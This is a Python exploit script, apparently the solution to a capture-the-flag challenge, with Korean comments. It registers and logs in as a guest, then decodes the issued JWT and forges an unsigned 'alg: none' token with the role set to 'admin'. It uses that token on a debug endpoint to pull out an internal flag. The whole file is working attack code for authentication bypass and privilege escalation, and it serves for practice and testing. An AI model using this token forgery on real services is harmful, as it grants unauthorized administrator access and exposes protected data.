#!/usr/bin/env python3

import sys
import requests
import json
import base64

def decode_jwt_payload(token):
    parts = token.split('.')
    payload = parts[1] + '=' * (4 - len(parts[1]) % 4)
    return json.loads(base64.urlsafe_b64decode(payload))

def create_none_token(payload):
    header = {"alg": "none", "typ": "JWT"}
    payload["role"] = "admin"
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    return f"{h}.{p}."

def exploit(ip, port):
    BASE_URL = f"http://{ip}:{port}/api"
    
    # 0. 회원가입
    register_data = {"username":"guest","email":"guest@guest.com","password":"123456"}
    response = requests.post(f"{BASE_URL}/auth/register", json=register_data)
    if response.status_code != 200:
        print("register_FAILED", file=sys.stderr)
        return
    
    # 1. 로그인
    login_data = {"email": "guest@guest.com", "password": "123456"}
    response = requests.post(f"{BASE_URL}/auth/login", json=login_data)
    if response.status_code != 200:
        print("LOGIN_FAILED", file=sys.stderr)
        return
    
    token = response.json()['token']
    
    # 2. 기존 토큰 payload 디코딩
    payload = decode_jwt_payload(token)
    
    # 3. NONE 알고리즘을 이용해 admin 토큰 생성
    admin_token = create_none_token(payload)
    
    # 4. admin 토큰으로 debug 공격
    headers = {"Authorization": f"Bearer {admin_token}"}
    debug_data = {"token": admin_token}
    response = requests.post(f"{BASE_URL}/auth/debug", json=debug_data, headers=headers)
    
    if response.status_code == 200:
        data = response.json()
        print(f"[*] Debug response: {json.dumps(data, indent=2)}", file=sys.stderr)
        
        # 플래그 추출 시도
        try:
            flag = data['debug_info']['payload']['debug_info']['internal_flag']
            # Git-based CTF format: output flag as JSON
            print(json.dumps({"flag": flag}))
        except KeyError as e:
            print(f"[!] Failed to extract flag: {e}", file=sys.stderr)
            print(f"[!] Available keys: {list(data.keys())}", file=sys.stderr)
            if 'debug_info' in data:
                print(f"[!] debug_info keys: {list(data['debug_info'].keys())}", file=sys.stderr)
                if 'payload' in data['debug_info']:
                    print(f"[!] payload keys: {list(data['debug_info']['payload'].keys())}", file=sys.stderr)
            sys.exit(1)
    else:
        print(f"[!] Debug request failed: status={response.status_code}", file=sys.stderr)
        print(f"[!] Response: {response.text}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    import os
    if len(sys.argv) >= 3:
        ip = sys.argv[1]
        port = int(sys.argv[2])
    else:
        ip = os.environ.get("TARGET_HOST", "127.0.0.1")
        port = int(os.environ.get("TARGET_PORT", "5000"))
    
    try:
        exploit(ip, port)
    except Exception as exc:
        print(f"exploit failed: {exc}", file=sys.stderr)
        sys.exit(1)
